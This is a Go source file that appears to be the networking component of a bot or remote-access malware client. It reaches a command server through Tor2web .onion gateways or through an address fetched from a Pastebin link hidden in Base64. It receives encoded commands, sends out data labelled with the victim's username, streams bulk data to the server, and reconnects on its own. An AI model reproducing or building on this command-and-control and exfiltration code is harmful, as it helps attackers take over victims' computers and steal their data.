package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"

	"./network"

	"zombiezen.com/go/capnproto2"
)

var c net.Conn //Global variable to send and receive from anywhere
var ip string
var torIp = []string{"tiked5bwdc5gov6y.onion.to:80", "tiked5bwdc5gov6y.onion.cab:80"}

func ConnectCN() (net.Conn, error) {

	ip = GetIp()
	_, err := net.Dial("tcp", ip)
	if err != nil {
		fmt.Println(err.Error())
		Wait()
		ConnectCN()
	}
	return net.Dial("tcp", ip)
}

func Connect() (net.Conn, error) {
	fmt.Println("Trying to connect (tor)")
	_, err := net.Dial("tcp", torIp[0])
	if err != nil {
		fmt.Println(err.Error())
		Wait()
		Connect()
	}
	fmt.Println("Valid con")
	return net.Dial("tcp", torIp[0])
}

func GetIp() string {
	resp, _ := http.Get(Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

func Send(pre string, msg string) {
	c.Write([]byte(pre + "|" + msg)) //var c is located in client.go
}

func ReciveCommand() network.Command {

	msg, err := capnp.NewDecoder(c).Decode()
	if err != nil {
		panic(err)
	}
	// Extract the root struct from the message.
	commad, err := network.ReadRootCommand(msg)
	if err != nil {
		panic(err)
	}

	// Access fields from the struct.
	return commad
}

func SendData(data string) {
	msg, seg, err := capnp.NewMessage(capnp.SingleSegment(nil))
	if err != nil {
		panic(err)
	}

	// Create a new Book struct.  Every message must have a root struct.
	cnp, err := network.NewRootCommand(seg)
	if err != nil {
		panic(err)
	}
	// id
	cnp.SetCmd(GetUsername())
	// Data
	cnp.SetArgs(data)
	cnp.SetDate(time.Now().Unix()) // Set int date
	err = capnp.NewEncoder(c).Encode(msg)
	if err != nil {
		panic(err)
	}
}
func SendBig(data io.Reader) {
	io.Copy(c, data)
}

func Receive() string {
	status, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		c, _ = Connect()
	}
	return status
}
